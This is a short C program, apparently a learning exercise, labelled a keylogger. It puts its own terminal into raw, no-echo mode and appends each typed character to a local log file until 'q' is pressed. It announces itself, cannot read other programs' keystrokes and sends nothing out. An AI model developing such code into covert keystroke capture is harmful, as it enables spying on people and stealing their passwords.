// C keylogger
// simple keylogger in C that register what typed in terminal and write in a created log file

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <termios.h>
#include <fcntl.h>

// set terminal in raw mode
void set_raw_mode(){
    struct termios term;                       
    tcgetattr(STDIN_FILENO, &term);             // get current terminal settings
    term.c_lflag &= ~(ICANON | ECHO);           // disable canonical mode and echo
    term.c_cc[VMIN] = 1;                        // min chars
    term.c_cc[VTIME] = 0;                       // no timeout
    tcsetattr(STDIN_FILENO, TCSANOW, &term);    // apply changes
}

// reset to normal mode
void reset_terminal_mode(){
    struct termios term;
    tcgetattr(STDIN_FILENO, &term);
    term.c_lflag |= (ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &term);
}

int main(){
    char ch;
    FILE *log_file = fopen("log_file.txt", "a");
    if (log_file == NULL){
        perror("Failed to open file");
        return 1;
    }
    set_raw_mode();
    printf("Keylogger running. Press 'q' to quit\n");
    while(1){
        ch = getchar();                 // read keyboard inputs
        fprintf(log_file, "%c", ch);    // write the char in the log file
        fflush(log_file);
        if (ch == 'q'){
            break;
        }
    }
    reset_terminal_mode();
    fclose(log_file);
    return 0;
}